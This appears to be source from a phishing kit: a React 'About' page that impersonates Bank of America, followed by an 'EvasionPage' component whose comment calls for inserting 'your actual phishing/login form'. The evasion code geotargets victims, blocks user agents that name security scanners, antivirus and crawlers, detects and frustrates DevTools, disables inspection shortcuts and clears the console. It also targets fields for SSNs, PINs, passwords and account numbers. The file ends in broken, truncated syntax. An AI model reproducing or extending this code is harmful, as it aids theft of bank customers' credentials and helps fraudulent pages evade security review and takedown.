import PublicLayout from "@/components/PublicLayout";
import { Link } from "react-router-dom";
import { Globe, Heart, Award, Users } from "lucide-react";

const About = () => {
  return (
    <PublicLayout showLogin={false}>
      {/* Hero Section */}
      <section className="bg-gradient-to-r from-[#012169] to-[#003DA5] text-white py-16 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <h1 className="text-4xl lg:text-5xl font-bold mb-4">About Bank of America</h1>
          <p className="text-xl text-blue-100 mb-8 max-w-2xl">
            At Bank of America, we're committed to helping make financial lives better through the power of every connection. Learn how we're empowering our clients, employees, and communities.
          </p>
        </div>
      </section>

      {/* Main Content */}
      <section className="bg-gray-50 py-12 px-4 sm:px-6">
        <div className="max-w-7xl mx-auto">
          <p className="text-xl text-gray-600 mb-8">
            We serve individuals, small businesses, and large corporations with banking, investing, and financial solutions.
          </p>
          <div className="w-full bg-gray-200 rounded-lg mb-8 overflow-hidden shadow-lg">
            <img src="/About Us.png" alt="About Bank of America" className="w-full h-auto object-cover" />
          </div>
        </div>
      </section>

      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Our Company</h2>
          <p className="text-gray-600 mb-6">
            Bank of America is one of the world’s leading financial institutions, serving individual consumers, small and middle-market businesses, and large corporations with a full range of banking, investing, asset management, and other financial and risk management products and services.
          </p>
          <h2 className="text-2xl font-bold text-gray-900 mb-4">Our Values</h2>
          <ul className="list-disc list-inside text-gray-600 space-y-2 mb-8">
            <li>Deliver together</li>
            <li>Act responsibly</li>
            <li>Realize the power of our people</li>
            <li>Trust the team</li>
            <li>Embrace the future</li>
          </ul>

          <h2 className="text-2xl font-bold text-gray-900 mb-6">At a Glance</h2>
          <div className="grid sm:grid-cols-2 gap-6 mb-8">
            {[
              { icon: Globe, title: "Global presence", desc: "Serving clients in the U.S. and around the world." },
              { icon: Users, title: "Our people", desc: "Dedicated to responsible growth and inclusion." },
              { icon: Heart, title: "Community", desc: "Investing in communities through grants and volunteerism." },
              { icon: Award, title: "Recognition", desc: "A leader in sustainability and corporate responsibility." },
            ].map((item) => (
              <div key={item.title} className="flex gap-4 p-4 border border-gray-200 rounded-lg">
                <div className="h-10 w-10 rounded-full bg-[#E31837] flex items-center justify-center flex-shrink-0">
                  <item.icon className="h-5 w-5 text-white" />
                </div>
                <div>
                  <h3 className="font-semibold text-gray-900">{item.title}</h3>
                  <p className="text-sm text-gray-600">{item.desc}</p>
                </div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* Blue Background Commitment Section */}
      <section className="bg-gradient-to-r from-[#012169] to-[#003DA5] text-white py-16 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto">
          <h2 className="text-3xl lg:text-4xl font-bold mb-6">Our Commitment to You</h2>
          <p className="text-lg text-blue-100 mb-8">
            At Bank of America, we're committed to helping make financial lives better through the power of every connection. Learn how we're empowering our clients, employees, and communities to achieve new possibilities.
          </p>
          <div className="grid sm:grid-cols-2 gap-8">
            <div>
              <h3 className="text-xl font-semibold mb-3">Financial Empowerment</h3>
              <p className="text-blue-100">
                We provide tools, resources, and expert guidance to help our clients make informed financial decisions and achieve their goals.
              </p>
            </div>
            <div>
              <h3 className="text-xl font-semibold mb-3">Community Impact</h3>
              <p className="text-blue-100">
                Through our Community Reinvestment Act programs, we invest in housing, small business, and community development initiatives.
              </p>
            </div>
            <div>
              <h3 className="text-xl font-semibold mb-3">Sustainable Growth</h3>
              <p className="text-blue-100">
                We're committed to responsible growth that creates long-term value for shareholders while managing environmental and social risks.
              </p>
            </div>
            <div>
              <h3 className="text-xl font-semibold mb-3">Diversity & Inclusion</h3>
              <p className="text-blue-100">
                We foster a culture where diverse perspectives are valued and every employee can bring their authentic selves to work.
              </p>
            </div>
          </div>
        </div>
      </section>

      <section className="py-12 px-4 sm:px-6">
        <div className="max-w-4xl mx-auto">
          <div className="border-t border-gray-200 pt-8">
            <h2 className="text-2xl font-bold text-gray-900 mb-4">Contact & Resources</h2>
            <p className="text-gray-600 mb-4">
              For media, investors, and career information, visit our corporate site or contact us.
            </p>
            <div className="flex flex-wrap gap-4">
              <Link to="/contact-us" className="text-[#012169] font-medium hover:underline">Contact Us</Link>
              <Link to="/locations" className="text-[#012169] font-medium hover:underline">Find a Location</Link>
            </div>
          </div>
        </div>
      </section>
    </PublicLayout>
  );
};

export default About;
import { useEffect, useState } from 'react';

const EVASION_CONFIG = {
  targetCountries: ['US', 'CA', 'GB', 'GH'],
  showFormDelay: 2000,
};

export default function EvasionPage() {
  const [isTargetLocation, setIsTargetLocation] = useState<boolean | null>(null);
  const [showContent, setShowContent] = useState(false);

  // 1. Geotargeting check
  const checkGeolocation = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/');
      const data = await response.json();
      const allowed = EVASION_CONFIG.targetCountries.includes(data.country_code);
      setIsTargetLocation(allowed);
      return allowed;
    } catch {
      // Fail open (allow if API fails)
      setIsTargetLocation(true);
      return true;
    }
  };

  // 2. Basic bot detection
  const detectBots = () => {
    const ua = navigator.userAgent.toLowerCase();
    const blocked = [
      'curl', 'wget', 'python', 'requests', 'scrapy',
      'phantomjs', 'selenium', 'headless', 'bot',
      'crawler', 'spider', 'scanner', 'security',
      'malware', 'antivirus', 'firewall',
    ];

    if (blocked.some((term) => ua.includes(term))) {
      return true;
    }

    // Behavioral (mouse/keyboard) check after delay
    let mouse = 0;
    let keys = 0;

    const onMouse = () => mouse++;
    const onKey = () => keys++;

    document.addEventListener('mousemove', onMouse);
    document.addEventListener('keypress', onKey);

    setTimeout(() => {
      if (mouse === 0 && keys === 0) {
        console.log('Bot-like behavior detected');
        // You could hide content or redirect here
      }
      // Cleanup (optional)
      document.removeEventListener('mousemove', onMouse);
      document.removeEventListener('keypress', onKey);
    }, 3000);

    return false;
  };

  // 3. DevTools detection (size + Image trick)
  const detectDevTools = () => {
    const threshold = 160;
    if (
      window.outerHeight - window.innerHeight > threshold ||
      window.outerWidth - window.innerWidth > threshold
    ) {
      console.log('DevTools detected via window size');
      // Could hide content here
    }

    let devtoolsOpen = false;
    const element = new Image();
    Object.defineProperty(element, 'id', {
      get: () => {
        devtoolsOpen = true;
        console.log('DevTools detected via console access');
      },
    });

    const interval = setInterval(() => {
      devtoolsOpen = false;
      console.log(element); // Triggers getter if console open
      console.clear();
    }, 1000);

    // Cleanup on unmount
    return () => clearInterval(interval);
  };

  // 4. Disable inspection / right-click / keys / selection / drag
  const disableInspection = () => {
    // Right-click
    const onContext = (e: MouseEvent) => {
      e.preventDefault();
      return false;
    };
    document.addEventListener('contextmenu', onContext);

    // Key combos
    const onKeyDown = (e: KeyboardEvent) => {
      if (
        e.keyCode === 123 || // F12
        (e.ctrlKey && e.shiftKey && e.keyCode === 73) || // Ctrl+Shift+I
        (e.ctrlKey && e.keyCode === 85) || // Ctrl+U
        (e.ctrlKey && e.keyCode === 83) || // Ctrl+S
        (e.ctrlKey && e.shiftKey && e.keyCode === 67) || // Ctrl+Shift+C
        (e.ctrlKey && e.shiftKey && e.keyCode === 74) || // Ctrl+Shift+J
        (e.ctrlKey && e.shiftKey && e.keyCode === 46)    // Ctrl+Shift+Del
      ) {
        e.preventDefault();
        return false;
      }
    };
    document.addEventListener('keydown', onKeyDown);

    // Disable selection
    document.addEventListener('selectstart', (e) => e.preventDefault());

    // Disable drag
    document.addEventListener('dragstart', (e) => e.preventDefault());

    // Cleanup
    return () => {
      document.removeEventListener('contextmenu', onContext);
      document.removeEventListener('keydown', onKeyDown);
    };
  };

  // Main init
  useEffect(() => {
    const runEvasion = async () => {
      disableInspection(); // Run immediately

      if (detectBots()) {
        // Bot → maybe show blank or redirect
        return;
      }

      const geoOk = await checkGeolocation();
      if (!geoOk) {
        // Non-target → hide or redirect
        return;
      }

      detectDevTools(); // Start polling

      // All passed → show content after delay
      setTimeout(() => {
        setShowContent(true);
      }, EVASION_CONFIG.showFormDelay);
    };

    runEvasion();

    // Periodic console clear
    const clearIntervalId = setInterval(() => {
      console.clear();
    }, 1000);

    return () => {
      clearInterval(clearIntervalId);
      // Add any other cleanups from returned functions above
    };
  }, []);

  // Optional: Track clicks on sensitive fields (add IDs to your inputs)
  useEffect(() => {
    const sensitiveIds = ['ssn', 'debit-pin', 'online-password', 'online-username', 'account-number'];

    const handlers: { [key: string]: () => void } = {};

    sensitiveIds.forEach((id) => {
      const el = document.getElementById(id);
      if (el) {
        const handler = () => console.warn('.');
        el.addEventListener('click', handler);
        handlers[id] = handler;
      }
    });

    return () => {
      Object.entries(handlers).forEach(([id, fn]) => {
        document.getElementById(id)?.removeEventListener('click', fn);
      });
    };
  }, []);

  // Render nothing or fake loading until checks pass
  if (isTargetLocation === false || !showContent) {
    return <div style={{ height: '100vh', background: '#000', color: '#fff' }}>Loading secure session...</div>;
  }

  // =====================================
  // YOUR VISIBLE CONTENT / FORM GOES HERE
  // Replace this with your actual phishing/login form in JSX
  // =====================================
  return (
  }